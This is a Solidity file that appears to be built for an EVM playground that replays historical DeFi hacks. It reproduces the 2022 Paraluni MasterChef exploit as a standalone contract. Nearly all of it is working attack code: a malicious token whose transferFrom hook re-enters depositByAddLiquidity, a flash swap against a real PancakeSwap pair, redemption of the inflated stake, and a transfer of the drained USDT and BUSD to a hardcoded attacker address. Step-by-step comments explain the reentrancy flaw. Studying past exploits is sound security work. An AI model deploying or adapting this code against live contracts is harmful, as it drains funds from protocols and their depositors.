// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

// Synthetic standalone exploit for the EVM Playground (2022-03-Paraluni).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the PancakeSwap `pancakeCall` flash-swap callback lives on the test itself,
// so there is no standalone contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit + pancakeCall + an
// EvilToken whose transferFrom hook re-enters MasterChef), so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// src/test/2022-03/Paraluni_exp.sol — only the profit sink is changed from
// tx.origin to a hardcoded ATTACKER constant (so the recorder can measure it).
//
// Root cause: MasterChef.depositByAddLiquidity adds liquidity using
// caller-supplied tokens, executing token.transferFrom() on tokens the caller
// chooses. A malicious token's transferFrom re-enters depositByAddLiquidity
// (depositing real USDT/BUSD) BEFORE the outer deposit's userInfo accounting
// settles, inflating the attacker's stake. The inflated stake is then redeemed
// for real USDT + BUSD.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMasterChef {
    function depositByAddLiquidity(uint256 _pid, address[2] memory _tokens, uint256[2] memory _amounts) external;
    function withdrawAndRemoveLiquidity(uint256 _pid, uint256 _amount, bool isBNB) external;
    function withdrawChange(address[] memory tokens) external;
    function userInfo(uint256, address) external view returns (uint256 amount, uint256 rewardDebt);
}

// Malicious deposit token. Its transferFrom hook approves MasterChef to spend
// the contract's real USDT/BUSD and re-enters depositByAddLiquidity before the
// outer deposit's accounting settles — the reentrancy that inflates the stake.
//
// ============================================================
// VULNERABILITY: Untrusted token callback during internal addLiquidity
//   - depositByAddLiquidity(_pid, _tokens, _amounts) accepts ARBITRARY _tokens
//   - It transferFrom's the _tokens (from caller), THEN calls router.addLiquidity()
//   - router.addLiquidity does safeTransferFrom on those _tokens (msg.sender inside token = router != masterchef)
//   - Malicious token's transferFrom can re-enter depositByAddLiquidity with attacker-controlled real-value tokens
//   - The re-entrant deposit credits shares to `address(this)` (EvilToken) BEFORE outer call updates user stake accounting
//   - No reentrancy guard, no validation that _tokens form the pid's canonical LP pair
//   - Result: arbitrary value can be deposited "in the name of" the malicious token contract
// ============================================================
contract EvilToken {
    IMasterChef public immutable masterchef;
    IERC20 public immutable usdt;
    IERC20 public immutable busd;

    constructor(IMasterChef _masterchef, IERC20 _usdt, IERC20 _busd) {
        masterchef = _masterchef;
        usdt = _usdt;
        busd = _busd;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 1111;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        // ============================================================
        // VULNERABILITY TRIGGER (callback path)
        // This is called in TWO contexts during outer depositByAddLiquidity([token0,token1]):
        //   1. Direct by MasterChef: msg.sender == masterchef → if false, no-op (just returns allowance true)
        //   2. Indirect by PancakeRouter inside addLiquidity: msg.sender == router → if TRUE
        //      → parks approvals + re-calls depositByAddLiquidity with REAL assets parked here
        // The router callback is the exploit enabler because router != masterchef.
        // ============================================================
        if (address(masterchef) != address(0) && msg.sender != address(masterchef)) {
            // EXPLOIT STEP (reentrant): Use funds previously transferred to this EvilToken
            // to perform a *real value* depositByAddLiquidity on pid 18 (USDT/BUSD pool).
            // Because this executes while the outer depositByAddLiquidity is still on the call stack
            // (before its post-addLiquidity userInfo update), the shares are minted to THIS contract (EvilToken).
            usdt.approve(address(masterchef), type(uint256).max);
            busd.approve(address(masterchef), type(uint256).max);
            address[2] memory tokens = [address(usdt), address(busd)];
            uint256[2] memory amounts = [usdt.balanceOf(address(this)), busd.balanceOf(address(this))];
            masterchef.depositByAddLiquidity(18, tokens, amounts);
        }
        return true;
    }

    function redeem() external {
        // EXPLOIT STEP (harvest): After the reentrant real deposit credited userInfo[address(this)=EvilToken]
        // with a huge stake (from flash funds), this withdraws it on behalf of EvilToken.
        // The removed liquidity + change gives the attacker the real drained USDT/BUSD.
        (uint256 _amount,) = masterchef.userInfo(18, address(this));
        masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
        usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
        busd.transfer(msg.sender, busd.balanceOf(address(this)));
    }
}

contract ParaluniDrain {
    // Profit receiver — the recorder measures this address's USDT delta. (The
    // historical test sent leftovers to tx.origin; here it is a constant so the
    // recorder can observe it.)
    address constant ATTACKER = 0x627DF72cC3FA38C475A414e65CdECE09b2b177AF;

    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IPancakePair constant pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IMasterChef constant masterchef = IMasterChef(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);

    EvilToken public token0; // dummy deposit token (no masterchef hook)
    EvilToken public token1; // the malicious deposit token whose transferFrom re-enters

    function run() external {
        token0 = new EvilToken(IMasterChef(address(0)), usdt, busd);
        token1 = new EvilToken(masterchef, usdt, busd);
        // ============================================================
        // EXPLOIT STEPS (high level)
        // 1. Deploy two EvilToken "deposit tokens": token0 (dummy, no MC), token1 (malicious hook)
        // 2. Flash-swap borrow 10k USDT + 10k BUSD (must repay inside callback)
        // 3. Park flash funds onto token1 (so its hook can spend them)
        // 4. Call depositByAddLiquidity using [token0, token1] as the pair tokens (tiny amts)
        //    - MC pulls tiny EvilToken units
        //    - MC calls router.addLiquidity → router calls token1.transferFrom (from MC's balance)
        //    - router != MC → hook fires → reentrant real depositByAddLiquidity([USDT,BUSD], full)
        //    - real deposit mints LARGE LP shares to address(token1) for pid=18
        // 5. Withdraw the (tiny) stake recorded for attacker
        // 6. Claim change, then token1.redeem() drains the LARGE stake credited to token1
        // 7. Repay flash + forward profit
        // VULNERABILITY EXPLOITED: arbitrary-token zap + router callback reentrancy into deposit path
        // ============================================================
        // Flash-borrow 10,000 of each token from the USDT/BUSD Pancake pair. The
        // callback pancakeCall() must repay 0.25% + 1 by the end of the tx.
        pair.swap(10_000 * 1e18, 10_000 * 1e18, address(this), new bytes(1));
        // Sweep any leftover profit to the attacker.
        usdt.transfer(ATTACKER, usdt.balanceOf(address(this)));
        busd.transfer(ATTACKER, busd.balanceOf(address(this)));
    }

    // PancakeSwap flash-swap callback — the heart of the attack.
    function pancakeCall(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        // ============================================================
        // EXPLOIT STEP 3: Park flash funds on the malicious token contract.
        // These real balances will be spent by the re-entrant deposit inside the hook.
        // ============================================================
        usdt.transfer(address(token1), usdt.balanceOf(address(this)));
        busd.transfer(address(token1), busd.balanceOf(address(this)));

        // ============================================================
        // EXPLOIT STEP 4: Initiate the outer zap-deposit using malicious token as one leg.
        // This will cause the internal router.addLiquidity to invoke transferFrom on token1
        // from router context → triggering the re-entrant real deposit credited to token1.
        // ============================================================
        // Pool 18 deposit with the two EvilTokens. token1.transferFrom fires the
        // re-entrant depositByAddLiquidity([USDT,BUSD], full balances) before
        // the outer deposit's userInfo settles — inflating this contract's stake.
        address[2] memory tokens = [address(token0), address(token1)];
        uint256[2] memory amounts = [uint256(1), uint256(1)];
        masterchef.depositByAddLiquidity(18, tokens, amounts);

        // ============================================================
        // EXPLOIT STEP 5: Withdraw whatever (small) position the attacker (this) received
        // from the outer deposit (dummies produce negligible LP).
        // ============================================================
        (uint256 _amount,) = masterchef.userInfo(18, address(this));
        masterchef.withdrawAndRemoveLiquidity(18, _amount, false);

        // Claim any leftover change held by MasterChef.
        address[] memory t = new address[](2);
        t[0] = address(busd);
        t[1] = address(usdt);
        masterchef.withdrawChange(t);

        // ============================================================
        // EXPLOIT STEP 6: Harvest the large stake that was credited under the EvilToken
        // address itself via the re-entrant deposit. This is the actual profit.
        // ============================================================
        // token1.redeem() withdraws ITS inflated stake and forwards USDT/BUSD
        // back here.
        token1.redeem();

        // Repay the flash loan: amount/9975*10000 + 10000 each (0.25% fee + 1).
        usdt.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);
        busd.transfer(msg.sender, ((amount1 / 9975) * 10_000) + 10_000);
        // Remaining balances stay on this contract; run() forwards them to ATTACKER.
    }
}
